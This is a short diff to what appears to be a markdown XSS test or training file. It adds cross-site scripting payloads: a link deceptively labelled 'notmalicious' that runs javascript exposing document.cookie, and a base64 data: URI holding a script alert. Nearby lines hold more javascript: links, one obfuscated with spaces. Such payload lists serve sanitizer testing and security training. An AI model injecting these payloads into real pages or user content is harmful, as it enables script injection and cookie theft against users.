@@ -21,7 +21,8 @@ https://raw.githubusercontent.com/runcom/SATraining/master/index.html
 > &#61;"javascript&#58this;alert(1&#41;">*you*</a>
 
 3. &#61;"javascript&#58this;alert(1&#41;">*you*</a>
-4. 
+4. [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
 
 [a](javascript:prompt(document.cookie))
 [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
